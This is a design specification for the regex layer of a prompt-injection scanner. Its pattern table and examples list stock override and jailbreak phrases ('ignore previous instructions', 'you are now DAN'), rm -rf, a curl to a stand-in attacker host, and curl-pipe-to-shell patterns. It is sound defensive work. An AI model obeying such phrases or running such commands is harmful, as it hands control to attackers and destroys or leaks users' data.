# Pattern Matching

## Responsibility

Detect known prompt injection phrases in file content using regular expressions after text normalization. This layer catches direct instruction-override language ("ignore previous instructions"), authority claims ("these rules are non-negotiable"), destructive commands, data exfiltration patterns, and jailbreak attempts.

## Input

| Field | Type | Source | Description |
|-------|------|--------|-------------|
| `file` | `DiscoveredFile` | File Discovery | File metadata |
| `raw_bytes` | `bytes` | File system | Raw file content (shared with Byte-Level Analysis) |
| `normalized_text` | `str` | Internal normalization | File content after stripping invisible chars (from Byte Analysis findings), lowercased, whitespace-normalized |

## Output

| Field | Type | Consumers | Description |
|-------|------|-----------|-------------|
| `findings` | `List[PatternFinding]` | StaticResult assembler | Regex-matched injection patterns |

```python
@dataclass
class PatternFinding:
    category: str          # "instruction_override" | "authority_claim"
                           # | "destructive_command" | "data_exfiltration"
                           # | "shell_injection" | "jailbreak"
    severity: str          # "CRITICAL" | "HIGH" | "MEDIUM"
    line: int              # 1-based line number of the match
    column: int            # 1-based column of the match
    matched_text: str      # The matching text (max 120 chars, truncated with "...")
    pattern_id: str        # Identifier of the rule that matched
    description: str       # Human-readable explanation
```

## Behavior

```
DiscoveredFile + normalized_text
        │
        ▼
┌───────────────────────────┐
│ 1. Normalize text:        │
│    - Decode bytes → UTF-8 │
│    - Strip invisible chars│
│      (from byte findings) │
│    - Lowercase            │
│    - Collapse whitespace  │
└────────────┬──────────────┘
             │
             ▼
┌───────────────────────────┐
│ 2. Apply each compiled    │
│    regex pattern to each  │
│    line of the text       │
└────────────┬──────────────┘
             │
             ▼
┌───────────────────────────┐
│ 3. For each match:        │
│    - Resolve line/column  │
│    - Assign category      │
│    - Assign severity      │
│    - Generate description │
└────────────┬──────────────┘
             │
             ▼
      List[PatternFinding]
```

### Pattern Categories and Severity

| Pattern Group | Category | Severity | Rationale |
|---------------|----------|----------|-----------|
| Direct instruction override | `instruction_override` | CRITICAL | Core injection technique — "ignore previous instructions" |
| Authority claims | `authority_claim` | HIGH | Attempts to establish rule priority — "these rules override..." |
| Destructive commands | `destructive_command` | CRITICAL | Commands to delete/destroy — "rm -rf", "delete all tests" |
| Data exfiltration | `data_exfiltration` | CRITICAL | Commands to send data externally — "curl attacker.com/collect" |
| Shell injection via agent | `shell_injection` | CRITICAL | Commands to execute arbitrary code — "run curl... | sh" |
| Jailbreak / role override | `jailbreak` | HIGH | Persona manipulation — "you are now DAN", "developer mode" |

### Pattern Matching Rules

```python
INJECTION_PATTERNS: list[tuple[str, str, str]] = [
    # (pattern_id, regex, category)

    # --- Instruction Override ---
    ("INSTR_001",
     r"(?:ignore|disregard|forget|override)\s+(?:all\s+)?(?:previous|prior|above|system|earlier)\s+(?:instructions?|prompts?|rules?|context)",
     "instruction_override"),

    # --- Authority Claims ---
    ("AUTH_001",
     r"(?:you\s+(?:must|shall|are\s+required\s+to)|these\s+rules?\s+(?:are|supersede|override|take\s+precedence))",
     "authority_claim"),
    ("AUTH_002",
     r"(?:non-?negotiable|highest\s+priority|cannot\s+be\s+overridden)",
     "authority_claim"),

    # --- Destructive Commands ---
    ("DEST_001",
     r"(?:delete|remove|destroy|nuke|wipe|drop)\s+(?:all|every|the\s+entire)\s+",
     "destructive_command"),
    ("DEST_002",
     r"(?:rm\s+-rf|rmdir|shutil\.rmtree|os\.remove)",
     "destructive_command"),

    # --- Data Exfiltration ---
    ("EXFIL_001",
     r"(?:curl|wget|fetch|http\.?(?:get|post|request))\s+.*(?:attacker|evil|exfil)",
     "data_exfiltration"),
    ("EXFIL_002",
     r"(?:send|post|upload|exfiltrate)\s+.*(?:to|towards)\s+(?:https?://|[a-z]+\.(?:com|io|net))",
     "data_exfiltration"),

    # --- Shell Injection ---
    ("SHELL_001",
     r"(?:run|execute|eval|sh\s+-c|bash\s+-c|system\()\s*[\"']?(?:curl|wget|nc|python)",
     "shell_injection"),

    # --- Jailbreak ---
    ("JAIL_001",
     r"(?:you\s+are\s+now|new\s+persona|act\s+as\s+if|pretend\s+(?:you|that)|from\s+now\s+on\s+you)",
     "jailbreak"),
    ("JAIL_002",
     r"(?:developer\s+mode|\bDAN\b|do\s+anything\s+now)",
     "jailbreak"),
]
```

### Normalization Rules

Before regex matching, the text undergoes normalization. Two functions are provided:

- **`normalize_text(raw_bytes: bytes) -> str`** — full pipeline for raw bytes:
  1. **Decode**: `raw_bytes.decode("utf-8", errors="replace")` — replaces undecodable bytes with U+FFFD
  2. Delegate to `normalize_str` for the remaining steps

- **`normalize_str(text: str) -> str`** — post-decode normalization for already-decoded strings (e.g., pre-extracted comments from `extract_comments_and_strings`):
  1. **Strip invisible chars**: Remove characters identified by Byte-Level Analysis (zero-width, Unicode tags, ANSI escapes, bidi overrides)
  2. **Lowercase**: `.lower()`
  3. **Whitespace collapse**: `re.sub(r'[^\S\n]+', ' ', text)` — collapse runs of horizontal whitespace to a single space (newlines preserved for line-based matching)

### Source Code Handling

For files with `FileCategory.SOURCE_CODE`, the pipeline calls `extract_comments_and_strings()` before pattern matching. Only extracted comments and string literals are normalized and scanned — code identifiers and structural syntax are excluded. This mirrors the LLM classification path and eliminates false positives on code identifiers (e.g., `findAnnotation` matching `\bDAN\b` in identifier substrings) and benign Javadoc phrases (e.g., `"This is the method you must override"`).

## Edge Cases

| Case | Handling |
|------|----------|
| File contains only invisible characters | After stripping, normalized text is empty → return empty findings |
| File is not valid UTF-8 | Use `errors="replace"`; non-decodable bytes become U+FFFD; regex matches work on remaining valid text |
| Multiple patterns match the same text | Report all matches independently (each pattern is a separate concern) |
| Very long lines (>100K characters) | Regex is applied per-line after splitting on `\n`; no single-line regex runs on the whole file |
| Pattern matches inside code comments | Valid finding — injection payloads in comments are still injection payloads |
| Pattern matches inside string literals in source code | Valid finding — this is the jqwik attack pattern (injection hidden in source code strings) |
| False positive on legitimate documentation | Reported as `MEDIUM` severity if the match is inside a `.md` file with `category != "agent_instruction"` |
| Source code file with no comments/strings | `extract_comments_and_strings` falls back to full decoded content (L009); pattern matching degrades gracefully to full-file scanning |
| Pygments unavailable for source code extraction | `extract_comments_and_strings` emits a warning and returns full decoded content; falls back to full-file scanning |

## Configuration Constants

All patterns are defined as module-level constants (see `INJECTION_PATTERNS` above). No runtime configuration.

```python
# Maximum length of matched_text in findings
MAX_MATCHED_TEXT_LENGTH: int = 120

# Regex timeout per pattern per line (seconds) — prevents ReDoS
REGEX_TIMEOUT_SECONDS: float = 0.1
```

All patterns are compiled with `re.IGNORECASE` — matching is case-insensitive across all pattern categories. The regex strings in `INJECTION_PATTERNS` do not include inline `(?i)` flags; the flag is applied uniformly at compilation time.

## Dependencies

- **File Discovery**: receives `DiscoveredFile`
- **Byte-Level Analysis**: normalization uses byte-level findings to strip invisible characters before regex matching

## Invariants

- **P001**: Regex patterns MUST be applied to normalized text (lowercase, whitespace-collapsed, invisible-chars-stripped), NOT to raw bytes. For source code files, the normalized text is derived from extracted comments and string literals (via `extract_comments_and_strings`), not the full file content — this prevents false positives on code identifiers and structural syntax.
- **P002**: Every `PatternFinding` MUST include the `pattern_id` of the rule that matched — for auditability.
- **P003**: Instruction override patterns (`INSTR_001`) and destructive command patterns (`DEST_001`, `DEST_002`) MUST be classified as CRITICAL severity.
- **P004**: Regex matching MUST use a timeout (`REGEX_TIMEOUT_SECONDS`) to prevent ReDoS attacks via malicious input.
- **P005**: The normalization step MUST use `errors="replace"` for UTF-8 decoding — the scanner MUST NOT crash on invalid UTF-8.

## Cross-References

- [System Overview](../architecture/system-overview.md)
- [File Discovery](file-discovery.md)
- [Byte-Level Analysis](byte-analysis.md)
- [Semantic Heuristics](semantic-heuristics.md)
- [Confidence Fusion](confidence-fusion.md)
- [Reporting](reporting.md)
